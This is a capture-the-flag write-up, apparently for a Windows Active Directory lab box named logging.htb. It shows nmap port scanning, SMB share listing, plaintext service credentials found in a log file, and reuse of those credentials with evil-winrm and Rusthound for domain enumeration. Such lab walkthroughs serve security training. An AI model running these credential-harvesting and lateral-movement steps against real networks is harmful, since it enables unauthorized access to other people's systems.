```shell
10.129.23.131
```

# User Flag
First we start with a `nmap` scan :
```shell
$ nmap 10.129.23.131 -p-    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-21 06:01 -0400
Nmap scan report for 10.129.23.131
Host is up (0.058s latency).
Not shown: 65505 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
8530/tcp  open  unknown
8531/tcp  open  unknown
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49686/tcp open  unknown
49687/tcp open  unknown
49690/tcp open  unknown
49691/tcp open  unknown
49713/tcp open  unknown
49719/tcp open  unknown
49746/tcp open  unknown
49776/tcp open  unknown
```
We have creds for a user, but first we need to know which path is accessible.
```shell
evil-winrm -i 10.129.23.131 -u 'wallace.everette' -p 'Welcome2026@'
xfreerdp /u:'wallace.everette' /p:'Welcome2026@' /v:10.129.23.131
```
Neither WinRM nor RDP is accessible, so we'll go thourgh SMB requests :
```shell
smbclient -L //10.129.23.131 -U 'wallace.everette%Welcome2026@'
```
And we got differents Sharenames :
- `ADMIN$` (access denied)
- `C$` (access denied)
- `IPC$` (probably denied)
- `Logs`
	- In **IdentitySync_Trace_20260219.log** : `[2026-02-09 03:00:03.125] [PID:4102] [Thread:04] VERBOSE - ConnectionContext Dump: { Domain: "logging.htb", Server: "DC01", SSL: "False", BindUser: "LOGGING\svc_recovery", BindPass: "Em3rg3ncyPa$$2025", Timeout: 30 }`
- `NETLOGON` (empty)
- `SYSVOL` (not empty but nothing interesting)
- `WSUSTemp` (listing denied)
Looking at the differents open ports, we see that 3389 (RDP) isn't open. But we see that 5985 (WinRM) **is** open, so we'll go through it with the new credentials we just got :
```shell
evil-winrm -i 10.129.23.131 -u 'svc_recovery' -p 'Em3rg3ncyPa$$2025' -d 'logging.htb'
```
and the user does not have access to a shell. However, we can use it to enumerate the AD with Rusthound :
```shell
sudo rusthound -u 'svc_recovery' -p 'Em3rg3ncyPa$$2025' -f 10.129.23.131 -d 'logging.htb' -z
```